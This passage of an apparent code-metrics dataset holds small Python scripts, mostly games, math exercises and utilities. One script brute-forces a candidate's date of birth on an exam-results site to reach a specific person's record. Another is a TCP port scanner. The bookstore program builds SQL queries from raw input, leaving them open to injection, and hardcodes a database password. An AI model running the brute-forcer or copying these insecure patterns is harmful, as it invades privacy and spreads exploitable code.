            self.select = piece
            self.valid_moves = self.board.get_valid_moves(piece)
            return True
        return False

    # to move the pieces
    def _move(self, row, col):
        piece = self.board.get_piece(row, col)
        if (self.select) and (piece == 0) and (row, col) in self.valid_moves:
            self.board.move(self.select, row, col)
            skip = self.valid_moves[(row, col)]
            if skip:
                self.board.remove(skip)
            self.chg_turn()
        else:
            return False
        return True

    # to draw next possible move
    def draw_moves(self, moves):
        for move in moves:
            row, col = move
            pg.draw.circle(
                self.window,
                red,
                (col * sq_size + sq_size // 2, row * sq_size + sq_size // 2),
                15,
            )

    # for changing the turn
    def chg_turn(self):
        self.valid_moves = {}
        if self.turn == black:
            self.turn = white
        else:
            self.turn = black
",1967,52,56,12,6,6,3,8.0,21,14,8,28.0,24,,42,134.03910001730776,210.0,4.666666666666667,medio,Yes,False,False,Low-Medium,id419
find_cube_root.py,"# This method is called exhaustive numeration!
# I am checking every possible value
# that can be root of given x systematically
# Kinda brute forcing


def cubeRoot():
    x = int(input(""Enter an integer: ""))
    for ans in range(0, abs(x) + 1):
        if ans ** 3 == abs(x):
            break
    if ans ** 3 != abs(x):
        print(x, ""is not a perfect cube!"")
    else:
        if x < 0:
            ans = -ans
    print(""Cube root of "" + str(x) + "" is "" + str(ans))


cubeRoot()

cont = str(input(""Would you like to continue: ""))
while cont == ""yes"":
    cubeRoot()
    cont = str(input(""Would you like to continue: ""))
    if cont == ""no"":
        exit()
    else:
        print(""Enter a correct answer(yes or no)"")
        cont = str(input(""Would you like to continue: ""))
",782,21,21,5,4,4,0,1.0,5,12,6,23.0,19,,35,96.22039775975506,162.53496664211536,3.631578947368421,medio,No,True,False,Low-Medium,id420
triangles.py,"max_size = 10

print(
    ""(a)""
    + "" "" * (max_size)
    + ""(b)""
    + "" "" * (max_size)
    + ""(c)""
    + "" "" * (max_size)
    + ""(d)""
    + "" "" * (max_size)
)

for i in range(1, max_size + 1):

    print(""*"" * i, end="" "" * (max_size - i + 3))

    print(""*"" * (max_size - i + 1), end="" "" * (i - 1 + 3))

    print("" "" * (i - 1) + ""*"" * (max_size - i + 1), end="" "" * 3)

    print("" "" * (max_size - i) + ""*"" * i)
",415,7,16,6,0,0,0,0.0,0,33,3,66.0,34,,99,177.72862410467502,515.735883197266,2.911764705882353,medio,No,False,False,Medium,id421
CountMillionCharacter.py,"""""""
Simple million word count program.
main idea is Python pairs words
with the number of times
that number appears in the triple quoted string.
Credit to William J. Turkel and Adam Crymble for the word
frequency code used below. I just merged the two ideas.
""""""
import re

pattern = re.compile(""\W"")  # re is used to compile the expression more than once
# wordstring consisting of a million characters
wordstring = """"""SCENE I. Yorkshire. Gaultree Forest.
Enter the ARCHBISHOP OF YORK, MOWBRAY, LORD HASTINGS, and others
ARCHBISHOP OF YORK
What is this forest call'd?
HASTINGS
'Tis Gaultree Forest, an't shall please your grace.
ARCHBISHOP OF YORK
Here stand, my lords; and send discoverers forth
To know the numbers of our enemies.
HASTINGS
We have sent forth already.
ARCHBISHOP OF YORK
'Tis well done.
My friends and brethren in these great affairs,
I must acquaint you that I have received
New-dated letters from Northumberland;
Their cold intent, tenor and substance, thus:
Here doth he wish his person, with such powers
As might hold sortance with his quality,
The which he could not levy; whereupon
He is retired, to ripe his growing fortunes,
To Scotland: and concludes in hearty prayers
That your attempts may overlive the hazard
And fearful melting of their opposite.
MOWBRAY
Thus do the hopes we have in him touch ground
And dash themselves to pieces.
Enter a Messenger
HASTINGS
Now, what news?
Messenger
West of this forest, scarcely off a mile,
In goodly form comes on the enemy;
And, by the ground they hide, I judge their number
Upon or near the rate of thirty thousand.
MOWBRAY
The just proportion that we gave them out
Let us sway on and face them in the field.
ARCHBISHOP OF YORK
What well-appointed leader fronts us here?
Enter WESTMORELAND
MOWBRAY
I think it is my Lord of Westmoreland.
WESTMORELAND
Health and fair greeting from our general,
The prince, Lord John and Duke of Lancaster.
ARCHBISHOP OF YORK
Say on, my Lord of Westmoreland, in peace:
What doth concern your coming?
WESTMORELAND
Then, my lord,
Unto your grace do I in chief address
The substance of my speech. If that rebellion
Came like itself, in base and abject routs,
Led on by bloody youth, guarded with rags,
And countenanced by boys and beggary,
I say, if damn'd commotion so appear'd,
In his true, native and most proper shape,
You, reverend father, and these noble lords
Had not been here, to dress the ugly form
Of base and bloody insurrection
With your fair honours. You, lord archbishop,
Whose see is by a civil peace maintained,
Whose beard the silver hand of peace hath touch'd,
Whose learning and good letters peace hath tutor'd,
Whose white investments figure innocence,
The dove and very blessed spirit of peace,
Wherefore do you so ill translate ourself
Out of the speech of peace that bears such grace,
Into the harsh and boisterous tongue of war;
Turning your books to graves, your ink to blood,
Your pens to lances and your tongue divine
To a trumpet and a point of war?
ARCHBISHOP OF YORK
Wherefore do I this? so the question stands.
Briefly to this end: we are all diseased,
And with our surfeiting and wanton hours
Have brought ourselves into a burning fever,
And we must bleed for it; of which disease
Our late king, Richard, being infected, died.
But, my most noble Lord of Westmoreland,
I take not on me here as a physician,
Nor do I as an enemy to peace
Troop in the throngs of military men;
But rather show awhile like fearful war,
To diet rank minds sick of happiness
And purge the obstructions which begin to stop
Our very veins of life. Hear me more plainly.
I have in equal balance justly weigh'd
What wrongs our arms may do, what wrongs we suffer,
And find our griefs heavier than our offences.
We see which way the stream of time doth run,
And are enforced from our most quiet there
By the rough torrent of occasion;
And have the summary of all our griefs,
When time shall serve, to show in articles;
Which long ere this we offer'd to the king,
And might by no suit gain our audience:
When we are wrong'd and would unfold our griefs,
We are denied access unto his person
Even by those men that most have done us wrong.
The dangers of the days but newly gone,
Whose memory is written on the earth
With yet appearing blood, and the examples
Of every minute's instance, present now,
Hath put us in these ill-beseeming arms,
Not to break peace or any branch of it,
But to establish here a peace indeed,
Concurring both in name and quality.
WESTMORELAND
When ever yet was your appeal denied?
Wherein have you been galled by the king?
What peer hath been suborn'd to grate on you,
That you should seal this lawless bloody book
Of forged rebellion with a seal divine
And consecrate commotion's bitter edge?
ARCHBISHOP OF YORK
My brother general, the commonwealth,
To brother born an household cruelty,
I make my quarrel in particular.
WESTMORELAND
There is no need of any such redress;
Or if there were, it not belongs to you.
MOWBRAY
Why not to him in part, and to us all
That feel the bruises of the days before,
And suffer the condition of these times
To lay a heavy and unequal hand
Upon our honours?
WESTMORELAND
O, my good Lord Mowbray,
Construe the times to their necessities,
And you shall say indeed, it is the time,
And not the king, that doth you injuries.
Yet for your part, it not appears to me
Either from the king or in the present time
That you should have an inch of any ground
To build a grief on: were you not restored
To all the Duke of Norfolk's signories,
Your noble and right well remember'd father's?
MOWBRAY
What thing, in honour, had my father lost,
That need to be revived and breathed in me?
The king that loved him, as the state stood then,
Was force perforce compell'd to banish him:
And then that Harry Bolingbroke and he,
Being mounted and both roused in their seats,
Their neighing coursers daring of the spur,
Their armed staves in charge, their beavers down,
Their eyes of fire sparking through sights of steel
And the loud trumpet blowing them together,
Then, then, when there was nothing could have stay'd
My father from the breast of Bolingbroke,
O when the king did throw his warder down,
His own life hung upon the staff he threw;
Then threw he down himself and all their lives
That by indictment and by dint of sword
Have since miscarried under Bolingbroke.
WESTMORELAND
You speak, Lord Mowbray, now you know not what.
The Earl of Hereford was reputed then
In England the most valiant gentlemen:
Who knows on whom fortune would then have smiled?
But if your father had been victor there,
He ne'er had borne it out of Coventry:
For all the country in a general voice
Cried hate upon him; and all their prayers and love
Were set on Hereford, whom they doted on
And bless'd and graced indeed, more than the king.
But this is mere digression from my purpose.
Here come I from our princely general
To know your griefs; to tell you from his grace
That he will give you audience; and wherein
It shall appear that your demands are just,
You shall enjoy them, every thing set off
That might so much as think you enemies.
MOWBRAY
But he hath forced us to compel this offer;
And it proceeds from policy, not love.
WESTMORELAND
Mowbray, you overween to take it so;
This offer comes from mercy, not from fear:
For, lo! within a ken our army lies,
Upon mine honour, all too confident
To give admittance to a thought of fear.
Our battle is more full of names than yours,
Our men more perfect in the use of arms,
Our armour all as strong, our cause the best;
Then reason will our heart should be as good
Say you not then our offer is compell'd.
MOWBRAY
Well, by my will we shall admit no parley.
WESTMORELAND
That argues but the shame of your offence:
A rotten case abides no handling.
HASTINGS
Hath the Prince John a full commission,
In very ample virtue of his father,
To hear and absolutely to determine
Of what conditions we shall stand upon?
WESTMORELAND
That is intended in the general's name:
I muse you make so slight a question.
ARCHBISHOP OF YORK
Then take, my Lord of Westmoreland, this schedule,
For this contains our general grievances:
Each several article herein redress'd,
All members of our cause, both here and hence,
That are insinew'd to this action,
Acquitted by a true substantial form
And present execution of our wills
To us and to our purposes confined,
We come within our awful banks again
And knit our powers to the arm of peace.
WESTMORELAND
This will I show the general. Please you, lords,
In sight of both our battles we may meet;
And either end in peace, which God so frame!
Or to the place of difference call the swords
Which must decide it.
ARCHBISHOP OF YORK
My lord, we will do so.
Exit WESTMORELAND
MOWBRAY
There is a thing within my bosom tells me
That no conditions of our peace can stand.
HASTINGS
Fear you not that: if we can make our peace
Upon such large terms and so absolute
As our conditions shall consist upon,
Our peace shall stand as firm as rocky mountains.
MOWBRAY
Yea, but our valuation shall be such
That every slight and false-derived cause,
Yea, every idle, nice and wanton reason
Shall to the king taste of this action;
That, were our royal faiths martyrs in love,
We shall be winnow'd with so rough a wind
That even our corn shall seem as light as chaff
And good from bad find no partition.
ARCHBISHOP OF YORK
No, no, my lord. Note this;    the king is weary
Of dainty and such picking grievances:
For he hath found to end one doubt by death
Revives two greater in the heirs of life,
And therefore will he wipe his tables clean
And keep no tell-tale to his memory
That may repeat and history his loss
To new remembrance; for full well he knows
He cannot so precisely weed this land
As his misdoubts present occasion:
His foes are so enrooted with his friends
That, plucking to unfix an enemy,
He doth unfasten so and shake a friend:
So that this land, like an offensive wife
That hath enraged him on to offer strokes,
As he is striking, holds his infant up
And hangs resolved correction in the arm
That was uprear'd to execution.
HASTINGS
Besides, the king hath wasted all his rods
On late offenders, that he now doth lack
The very instruments of chastisement:
So that his power, like to a fangless lion,
May offer, but not hold.
ARCHBISHOP OF YORK
'Tis very true:
And therefore be assured, my good lord marshal,
If we do now make our atonement well,
Our peace will, like a broken limb united,
Grow stronger for the breaking.
MOWBRAY
Be it so.
Here is return'd my Lord of Westmoreland.
Re-enter WESTMORELAND
WESTMORELAND
The prince is here at hand: pleaseth your lordship
To meet his grace just distance 'tween our armies.
MOWBRAY
Your grace of York, in God's name then, set forward.
ARCHBISHOP OF YORK
Before, and greet his grace: my lord, we come.
Exeunt""""""

wordlist = wordstring.split()  # splits each word with a space

for x, y in enumerate(wordlist):
    special_character = pattern.search(y[-1:])  # searches for a pattern in the string
    try:
        if special_character.group():  # returns all matching groups
            wordlist[x] = y[:-1]
    except BaseException:
        continue

wordfreq = [
    wordlist.count(w) for w in wordlist
]  # counts frequency of a letter in the given list

print(""String\n {} \n"".format(wordstring))
print(""List\n {} \n"".format(str(wordlist)))
print(""Frequencies\n {} \n"".format(str(wordfreq)))
print(""Pairs\n {}"".format(str(dict(zip(wordlist, wordfreq)))))
",11402,19,300,5,6,1,8,0.0,0,2,1,2.0,1,,4,0.0,4.0,1.0,medio,No,False,False,Low,id422
sendemail.py,"from __future__ import print_function

import base64
import mimetypes
import os
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import httplib2
import oauth2client
from apiclient import errors, discovery
from oauth2client import client, tools

SCOPES = ""https://www.googleapis.com/auth/gmail.send""
CLIENT_SECRET_FILE = ""client_secret.json""
APPLICATION_NAME = ""Gmail API Python Send Email""


def get_credentials():
    home_dir = os.path.expanduser(""~"")
    credential_dir = os.path.join(home_dir, "".credentials"")
    if not os.path.exists(credential_dir):
        os.makedirs(credential_dir)
    credential_path = os.path.join(credential_dir, ""gmail-python-email-send.json"")
    store = oauth2client.file.Storage(credential_path)
    credentials = store.get()
    if not credentials or credentials.invalid:
        flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES)
        flow.user_agent = APPLICATION_NAME
        credentials = tools.run_flow(flow, store)

        print(""Storing credentials to "" + credential_path)

    return credentials


def SendMessage(sender, to, subject, msgHtml, msgPlain, attachmentFile=None):
    credentials = get_credentials()
    http = credentials.authorize(httplib2.Http())
    service = discovery.build(""gmail"", ""v1"", http=http)
    if attachmentFile:
        message1 = createMessageWithAttachment(
            sender, to, subject, msgHtml, msgPlain, attachmentFile
        )
    else:
        message1 = CreateMessageHtml(sender, to, subject, msgHtml, msgPlain)
    result = SendMessageInternal(service, ""me"", message1)
    return result


def SendMessageInternal(service, user_id, message):
    try:
        message = (
            service.users().messages().send(userId=user_id, body=message).execute()
        )

        print(""Message Id: %s"" % message[""id""])

        return message
    except errors.HttpError as error:
        print(""An error occurred: %s"" % error)
        return ""Error""
    return ""OK""


def createMessageWithAttachment(sender, to, subject, msgHtml, msgPlain, attachmentFile):
    """"""Create a message for an email.

    Args:
        sender: Email address of the sender.
        to: Email address of the receiver.
        subject: The subject of the email message.
        msgHtml: Html message to be sent
        msgPlain: Alternative plain text message for older email clients
        attachmentFile: The path to the file to be attached.

    Returns:
        An object containing a base64url encoded email object.
    """"""
    message = MIMEMultipart(""mixed"")
    message[""to""] = to
    message[""from""] = sender
    message[""subject""] = subject

    messageA = MIMEMultipart(""alternative"")
    messageR = MIMEMultipart(""related"")

    messageR.attach(MIMEText(msgHtml, ""html""))
    messageA.attach(MIMEText(msgPlain, ""plain""))
    messageA.attach(messageR)

    message.attach(messageA)

    print(""create_message_with_attachment: file:"", attachmentFile)
    content_type, encoding = mimetypes.guess_type(attachmentFile)

    if content_type is None or encoding is not None:
        content_type = ""application/octet-stream""
    main_type, sub_type = content_type.split(""/"", 1)
    if main_type == ""text"":
        fp = open(attachmentFile, ""rb"")
        msg = MIMEText(fp.read(), _subtype=sub_type)
        fp.close()
    elif main_type == ""image"":
        fp = open(attachmentFile, ""rb"")
        msg = MIMEImage(fp.read(), _subtype=sub_type)
        fp.close()
    elif main_type == ""audio"":
        fp = open(attachmentFile, ""rb"")
        msg = MIMEAudio(fp.read(), _subtype=sub_type)
        fp.close()
    else:
        fp = open(attachmentFile, ""rb"")
        msg = MIMEBase(main_type, sub_type)
        msg.set_payload(fp.read())
        fp.close()
    filename = os.path.basename(attachmentFile)
    msg.add_header(""Content-Disposition"", ""attachment"", filename=filename)
    message.attach(msg)

    return {""raw"": base64.urlsafe_b64encode(message.as_string())}


def CreateMessageHtml(sender, to, subject, msgHtml, msgPlain):
    msg = MIMEMultipart(""alternative"")
    msg[""Subject""] = subject
    msg[""From""] = sender
    msg[""To""] = to
    msg.attach(MIMEText(msgPlain, ""plain""))
    msg.attach(MIMEText(msgHtml, ""html""))
    return {""raw"": base64.urlsafe_b64encode(msg.as_string())}


def main():
    to = input(""Enter Email Address: "")
    sender = input(""Your Mail ID: "")
    subject = input(""Enter your Subject: "")
    msgHtml = input(""Enter your Message: "")
    msgPlain = ""Hi\nPlain Email""
    SendMessage(sender, to, subject, msgHtml, msgPlain)
    # Send message with attachment:
    # SendMessage(sender, to, subject, msgHtml, msgPlain, '/path/to/file.pdf')


if __name__ == ""__main__"":
    main()
",4849,106,107,29,2,2,11,6.0,16,13,7,24.0,21,,37,111.8901503327572,177.87213211613133,4.0,medio,No,True,False,Low-Medium,id423
colour spiral.py,"# import turtle

import turtle
 
# defining colors

colors = ['red', 'yellow', 'green', 'purple', 'blue', 'orange']
 
# setup turtle pen

t= turtle.Pen()
 
# changes the speed of the turtle

t.speed(10)
 
# changes the background color

turtle.bgcolor(""black"")
 
# make spiral_web

for x in range(200):

    t.pencolor(colors[x%6]) # setting color

    t.width(x/100 + 1) # setting width

    t.forward(x) # moving forward

    t.left(59) # moving left
 
turtle.done()

t.speed(10)
 

turtle.bgcolor(""black"") # changes the background color
 
# make spiral_web

for x in range(200):

    t.pencolor(colors[x%6]) # setting color

    t.width(x/100 + 1) # setting width

    t.forward(x) # moving forward

    t.left(59) # moving left
 
turtle.done()",747,19,19,26,16,7,0,0.0,0,6,3,12.0,6,,18,20.264662506490406,57.058650025961626,3.0,alto,No,False,False,Low,id424
scrap_file.py,"# Author : RIZWAN AHMAD


# pip3 install requests

import requests


# Function for download file parameter taking as url


def download(url):
    f = open(
        ""file_name.jpg"", ""wb""
    )  # opening file in write binary('wb') mode with file_name.ext ext=extension
    f.write(requests.get(url).content)  # Writing File Content in file_name.jpg
    f.close()
    print(""Succesfully Downloaded"")


# Function is do same thing as method(download) do,but more strict
def download_2(url):
    try:
        response = requests.get(url)
    except Exception:
        print(""Failed Download!"")
    else:
        if response.status_code == 200:
            with open(""file_name.jpg"", ""wb"") as f:
                f.write(requests.get(url).content)
                print(""Succesfully Downloaded"")
        else:
            print(""Failed Download!"")


url = ""https://avatars0.githubusercontent.com/u/29729380?s=400&v=4""  # URL from which we want to download

download(url)
",966,20,22,12,7,4,0,,5,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id425
cricket_news.py,"from bs4 import BeautifulSoup
import requests
import pyttsx3

engine = pyttsx3.init()
voices = engine.getProperty(""voices"")
engine.setProperty(""voice"", voices[0].id)


def speak(audio):
    engine.say(audio)
    engine.runAndWait()


url = ""https://www.cricbuzz.com/cricket-news/latest-news""

ans = requests.get(url)

soup = BeautifulSoup(ans.content, ""html.parser"")

anchors = soup.find_all(""a"", class_=""cb-nws-hdln-ancr text-hvr-underline"")
i = 1
speak(""Welcome to sports news headlines!"")
for anchor in anchors:
    speak(anchor.get_text())
    i += 1
    if i == 11:
        break
    speak(""Moving on next sports headline.."")
speak(""These all are major headlines, have a nice day SIR"")
",721,22,22,8,0,0,0,,1,2,2,4.0,3,,6,6.754887502163469,13.931568569324174,1.3333333333333333,medio,No,False,False,Low,id426
Unit Digit of a raised to power b.py,"def last_digit(a, b):
    if b == 0:  # This Code assumes that 0^0 is 1
        return 1
    elif a % 10 in [0, 5, 6, 1]:
        return a % 10
    elif b % 4 == 0:
        return ((a % 10) ** 4) % 10
    else:
        return ((a % 10) ** (b % 4)) % 10


# Courtesy to https://brilliant.org/wiki/finding-the-last-digit-of-a-power/
",331,9,9,2,2,1,0,,4,13,4,26.0,13,,39,56.1057163358342,159.41105080876326,4.0,alto,No,False,False,Low-Medium,id427
portscanner.py,"from __future__ import print_function

import optparse  # Import the module
from socket import *  # Import the module
from threading import *  # Import the module

# Script Name	: portscanner.py
# Author		: Craig Richards
# Created		: 20 May 2013
# Last Modified	:
# Version		: 1.0
# Modifications	:
# Description	: Port Scanner, you just pass the host and the ports

screenLock = Semaphore(value=1)  # Prevent other threads from preceeding


def connScan(tgtHost, tgtPort):  # Start of the function
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)  # Open a socket
        connSkt.connect((tgtHost, tgtPort))
        connSkt.send("""")
        results = connSkt.recv(100)
        screenLock.acquire()  # Acquire the lock
        print(""[+] %d/tcp open"" % tgtPort)
        print(""[+] "" + str(results))
    except:
        screenLock.acquire()
        print(""[-] %d/tcp closed "" % tgtPort)
    finally:
        screenLock.release()
        connSkt.close()


def portScan(tgtHost, tgtPorts):  # Start of the function
    try:
        tgtIP = gethostbyname(tgtHost)  # Get the IP from the hostname
    except:
        print(""[-] Cannot resolve '%s': Unknown host"" % tgtHost)
        return
    try:
        tgtName = gethostbyaddr(tgtIP)  # Get hostname from IP
        print(""\n[+] Scan Results for: "" + tgtName[0])
    except:
        print(""\n[+] Scan Results for: "" + tgtIP)
    setdefaulttimeout(1)
    for tgtPort in tgtPorts:  # Scan host and ports
        t = Thread(target=connScan, args=(tgtHost, int(tgtPort)))
        t.start()


def main():
    parser = optparse.OptionParser(""usage %prog -H"" + "" <target host> -p <target port>"")
    parser.add_option(""-H"", dest=""tgtHost"", type=""string"", help=""specify target host"")
    parser.add_option(
        ""-p"",
        dest=""tgtPort"",
        type=""string"",
        help=""specify target port[s] seperated by a comma"",
    )
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split("","")
    if (tgtHost == None) | (tgtPorts[0] == None):
        print(parser.usage)
        exit(0)
    portScan(tgtHost, tgtPorts)


if __name__ == ""__main__"":
    main()
",2167,48,53,11,18,7,0,,8,11,4,22.0,19,,33,88.71062275542812,149.27754454988144,2.3157894736842106,medio,No,False,False,,id428
calculatorproject.py,"# Program make a simple calculator
def add(x, y):
    return x + y
def subtract(x, y):
    return x - y
def multiply(x, y):
    return x * y

def divide(x, y):
    return x / y


print(""Select operation."")
print(""1.Add"")
print(""2.Subtract"")
print(""3.Multiply"")
print(""4.Divide"")

while True:
    # Take input from the user
    choice = input(""Enter choice(1/2/3/4): "")

    # Check if choice is one of the four options
    if choice in ('1', '2', '3', '4'):
        num1 = float(input(""Enter first number: ""))
        num2 = float(input(""Enter second number: ""))

        if choice == '1':
            print(num1, ""+"", num2, ""="", add(num1, num2))

        elif choice == '2':
            print(num1, ""-"", num2, ""="", subtract(num1, num2))

        elif choice == '3':
            print(num1, ""*"", num2, ""="", multiply(num1, num2))

        elif choice == '4':
            print(num1, ""/"", num2, ""="", divide(num1, num2))
        break
    else:
        print(""Invalid Input"")
",973,29,29,9,3,3,0,4.0,4,9,6,18.0,14,,27,68.81274391313339,116.6920585619588,3.857142857142857,medio,No,True,False,Low,id429
jee_result.py,"import datetime

import mechanize
from bs4 import BeautifulSoup

# Create a Browser
b = mechanize.Browser()

# Disable loading robots.txt
b.set_handle_robots(False)

b.addheaders = [(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)"")]

# Navigate
b.open(""http://cbseresults.nic.in/jee/jee_2015.htm"")

# Choose a form
b.select_form(nr=0)

# Fill it out
b[""regno""] = ""37000304""

currentdate = datetime.date(1997, 3, 10)
enddate = datetime.date(1998, 4, 1)
while currentdate <= enddate:
    ct = 0
    # print currentdate
    yyyymmdd = currentdate.strftime(""%Y/%m/%d"")
    ddmmyyyy = yyyymmdd[8:] + ""/"" + yyyymmdd[5:7] + ""/"" + yyyymmdd[:4]
    print(ddmmyyyy)
    b.open(""http://cbseresults.nic.in/jee/jee_2015.htm"")
    b.select_form(nr=0)
    b[""regno""] = ""37000304""
    b[""dob""] = ddmmyyyy

    fd = b.submit()
    # print(fd.read())
    soup = BeautifulSoup(fd.read(), ""html.parser"")

    for writ in soup.find_all(""table""):
        ct = ct + 1
    # print (ct)
    if ct == 6:
        print(""---fail---"")
    else:
        print(""--true--"")
        break
    currentdate += datetime.timedelta(days=1)
    # print fd.read()
",1140,31,30,10,9,9,0,0.0,0,8,3,16.0,13,,24,52.86060383799767,96.0,1.8461538461538465,medio,No,False,False,Low,id430
Sum of digits of a number.py,"# Python code to calculate the sum of digits of a number, by taking number input from user.

import sys

def get_integer():
    for i in range(3,0,-1):                       # executes the loop 3 times. Giving 3 chances to the user.
        num = input(""enter a number:"")
        if num.isnumeric():                       # checks if entered input is an integer string or not.
            num = int(num)                        # converting integer string to integer. And returns it to where function is called.
            return num
        else:
            print(""enter integer only"")                    
            print(f'{i-1} chances are left' if (i-1)>1 else f'{i-1} chance is left')     # prints if user entered wrong input and chances left.
        continue   
        

def addition(num):
    Sum=0
    if type(num) is type(None):               # Checks if number type is none or not. If type is none program exits.
        print(""Try again!"")
        sys.exit()
    while num > 0:                            # Addition- adding the digits in the number.
        digit = int(num % 10)
        Sum += digit
        num /= 10
    return Sum                                # Returns sum to where the function is called.



if __name__ == '__main__':                    # this is used to overcome the problems while importing this file.                         
    number = get_integer()
    Sum = addition(number)
    print(f'Sum of digits of {number} is {Sum}')      # Prints the sum
",1494,25,25,7,10,1,0,2.0,7,11,8,21.0,12,,32,67.01955000865388,138.3016990363956,7.0,alto,No,True,False,Low-Medium,id431
bookstore_manangement_system.py,"import os


import mysql.connector as mys

mycon = mys.connect(
    host=""localhost"", user=""root"", passwd=""Yksrocks"", database=""book_store_management""
)


if mycon.is_connected():
    print()
    print(""successfully connected"")

mycur = mycon.cursor()


def DBZ():

    # IF  NO.  OF  BOOKS  IS     ZERO(0)     THAN  DELETE  IT  AUTOMATICALLY

    display = ""select * from books""
    mycur.execute(display)
    data2 = mycur.fetchall()

    for y in data2:

        if y[6] <= 0:

            delete = ""delete from books where  Numbers_of_book<=0""
            mycur.execute(delete)
            mycon.commit()


def separator():
    print()
    print(""\t\t========================================"")
    print()


def end_separator():
    print()
    print()


def login():

    user_name = input("" USER NAME  ---  "")
    passw = input("" PASSWORD  ---  "")

    display = ""select * from login""
    mycur.execute(display)
    data2 = mycur.fetchall()

    for y in data2:

        if y[1] == user_name and y[2] == passw:

            pass

        else:

            separator()

            print("" Username  or  Password  is  Incorrect  Try Again"")

            separator()

            user_name = input("" USER NAME  ---  "")
            passw = input("" PASSWORD  ---  "")

            if y[1] == user_name and y[2] == passw:

                pass

            else:

                separator()

                print("" Username  or  Password  is  Again  Incorrect"")
                exit()


def ViewAll():

    print(""\u0332"".join(""BOOK NAMES~~""))
    print(""------------------------------------"")

    display = ""select * from books""
    mycur.execute(display)
    data2 = mycur.fetchall()
    c = 0

    for y in data2:

        c = c + 1
        print(c, ""-->"", y[1])


def CNB1():

    if y[6] == 0:

        separator()

        print("" NOW  THIS  BOOK  IS  NOT  AVAILABLE "")

    elif y[6] > 0 and y[6] <= 8:

        separator()

        print(""WARNING!!!!!!!!!!!!!!!!!!!!!!!"")
        print(""NO.  OF THIS BOOK IS LOW"", ""\tONLY"", y[6] - 1, ""LEFT"")

        print()
        print()

    elif y[6] > 8:

        separator()

        print(""NO.  OF  BOOKS  LEFT  IS "", y[6] - 1)

        print()
        print()


def CNB2():

    if y[6] <= 8:

        separator()

        print(""WARNING!!!!!!!!!!!!!!!!!!!!!!!"")
        print(""NO.  OF THIS BOOK IS LOW"", ""\tONLY"", y[6], ""LEFT"")

    else:

        separator()

        print(""NO.  OF  BOOKS  LEFT  IS "", y[6])


separator()


# LOGIN


display12 = ""select * from visit""
mycur.execute(display12)
data2222 = mycur.fetchall()
for m in data2222:

    if m[0] == 0:

        c = m[0]
        display11 = ""select * from login""
        mycur.execute(display11)
        data222 = mycur.fetchall()

        if c == 0:

            if c == 0:

                print(""\t\t\t\t REGESTER     "")
                print(""\t\t\t\t----------------------------"")

                print()
                print()

                user_name = input(""ENTER  USER  NAME -- "")
                passw = input(""ENTER  PASSWORD  limit 8-20  -- "")
                lenght = len(passw)

                if lenght >= 8 and lenght <= 20:

                    c = c + 1
                    insert55 = (c, user_name, passw)
                    insert22 = ""insert into login values(%s,%s,%s)""
                    mycur.execute(insert22, insert55)
                    mycon.commit()

                    separator()

                    login()

                else:

                    if lenght < 8:

                        separator()

                        print("" Password Is less than  8  Characters  Enter Again"")

                        separator()

                        user_name2 = input(""ENTER  USER  NAME -- "")
                        passw2 = input(""ENTER  PASSWORD AGAIN (limit 8-20) -- "")
                        lenght1 = len(passw2)

                        if lenght1 >= 8 and lenght1 <= 20:

                            c = c + 1
                            insert555 = (c, user_name2, passw2)
                            insert222 = ""insert into login values(%s,%s,%s)""
                            mycur.execute(insert222, insert555)
                            mycon.commit()

                            separator()

                            login()

                        elif lenght > 20:

                            separator()

                            print(
                                "" Password Is  Greater  than  20  Characters  Enter Again""
                            )

                            separator()

                            user_name = input(""ENTER  USER  NAME -- "")
                            passw = input(""ENTER  PASSWORD AGAIN (limit 8-20) -- "")
                            lenght = len(passw)

                            if lenght >= 8 and lenght >= 20:

                                c = c + 1
                                insert55 = (c, user_name, passw)
                                insert22 = ""insert into login values(%s,%s,%s)""
                                mycur.execute(insert22, insert55)
                                mycon.commit()

                                separator()

                                login()

        update33 = ""update visit set visits=%s"" % (c)
        mycur.execute(update33)
        mycon.commit()

    elif m[0] == 1:

        if m[0] == 1:

            login()


separator()


DBZ()


# REPETITION


a = True


while a == True:

    # PROGRAM STARTED

    print(""     *TO VIEW ALL ENTER 1"")
    print(""     *TO SEARCH and BUY BOOK ENTER 2"")
    print(""     *TO ADD BOOK ENTER 3"")
    print(""     *TO UPDATE ENTER 4"")
    print(""     *TO DELETE BOOK ENTER 5"")
    print(""     *TO CLOSE ENTER 6"")

    print()

    choice = int(input(""ENTER YOUR CHOICE -- ""))

    separator()

    # VIEW

    if choice == 1:

        print()

        ViewAll()

        separator()

        rep = input(""Do  You  Want  To  Restart  ??    yes / no  --  "").lower()

        if rep == ""yes"":

            end_separator()

            separator()

            DBZ()

            continue

        else:

            end_separator()

            DBZ()

            os._exit(0)

        end_separator()

    # SEARCH / BUY

    if choice == 2:

        book_name = input(""ENTER BOOK NAME ---- "")

        separator()

        display = ""select * from books where Name='%s'"" % (book_name)
        mycur.execute(display)
        data2 = mycur.fetchone()

        if data2 != None:

            print(""BOOK IS AVAILABLE"")

            # BUY OR NOT

            separator()

            print(""\t*WANT TO BUY PRESS 1"")
            print(""\t*IF NOT PRESS 2"")
            print()

            choice2 = int(input(""ENTER YOUR CHOICE -- ""))

            if choice2 == 1:

                # BUY 1 OR MORE

                separator()

                print(""\t*IF YOU WANT ONE BOOK PRESS 1"")
                print(""\t*IF YOU WANT MORE THAN ONE BOOK PRESS 2"")
                print()

                choice3 = int(input(""ENTER YOUR CHOICE -- ""))

                if choice3 == 1:

                    display = ""select * from books""
                    mycur.execute(display)
                    data2 = mycur.fetchall()

                    for y in data2:

                        if y[1] == book_name:

                            if y[6] > 0:

                                separator()

                                u = (
                                    ""update books set Numbers_of_book=Numbers_of_book - 1 where name='%s';""
                                    % (book_name)
                                )
                                mycur.execute(u)
                                mycon.commit()

                                print(""BOOK WAS BOUGHT"")

                                separator()

                                print(""THANKS FOR COMING"")

                                CNB1()

                                separator()

                                rep = input(
                                    ""Do  You  Want  To  Restart  ??    yes / no  --  ""
                                ).lower()

                                if rep == ""yes"":

                                    end_separator()

                                    separator()

                                    DBZ()

                                    continue

                                else:

                                    end_separator()

                                    DBZ()

